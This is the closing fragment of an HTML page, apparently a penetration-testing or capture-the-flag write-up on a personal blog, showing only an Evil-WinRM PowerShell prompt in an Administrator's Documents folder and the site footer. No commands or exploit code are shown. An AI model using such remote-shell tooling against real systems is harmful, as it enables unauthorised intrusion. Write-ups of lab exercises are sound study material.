<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span>
</pre></div></br></br></br></br></br></br></br></br></br></br></br></br>
            </div>
        </div>
    </section>

    <footer>
        <p>&copy; 2024 elswix.github.io</p>
    </footer>
</body>
</html>
